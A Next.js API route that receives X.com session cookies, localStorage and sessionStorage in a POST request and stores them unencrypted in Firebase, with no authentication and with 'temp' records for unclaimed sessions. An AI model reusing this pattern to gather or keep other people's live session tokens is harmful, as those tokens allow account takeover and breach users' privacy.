import { NextRequest, NextResponse } from 'next/server'
import { adminDb } from '@/lib/firebase-admin'

export async function POST(request: NextRequest) {
  try {
    const { sessionData, userId } = await request.json()
    
    // Basic validation
    if (!sessionData || !sessionData.cookies) {
      return NextResponse.json({ 
        error: 'Invalid session data. Need cookies from X.com'
      }, { status: 400 })
    }

    // If userId provided, store in main collection, otherwise use temp
    const targetUserId = userId || `temp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    const collection = userId ? 'x_sessions' : 'x_sessions_temp'

    console.log('🔐 Direct X session capture for:', targetUserId, 'in collection:', collection)

    // Store the captured X session data
    await adminDb.collection(collection).doc(targetUserId).set({
      cookies: sessionData.cookies,
      localStorage: sessionData.localStorage || {},
      sessionStorage: sessionData.sessionStorage || {},
      userAgent: sessionData.userAgent || '',
      capturedAt: new Date(),
      capturedUrl: sessionData.url || 'x.com',
      isValid: true,
      isDirect: true,
      needsClaiming: !userId // If no userId provided, needs to be claimed
    })

    console.log('✅ Direct X session data captured and stored')

    return NextResponse.json({
      success: true,
      message: 'X session captured successfully',
      sessionId: targetUserId,
      needsClaiming: !userId,
      sessionInfo: {
        cookieCount: Object.keys(sessionData.cookies).length,
        localStorageKeys: Object.keys(sessionData.localStorage || {}).length,
        capturedAt: new Date().toISOString()
      }
    })

  } catch (error) {
    console.error('❌ Error in direct X session capture:', error)
    return NextResponse.json({
      error: 'Failed to capture X session',
      details: error instanceof Error ? error.message : 'Unknown error'
    }, { status: 500 })
  }
}
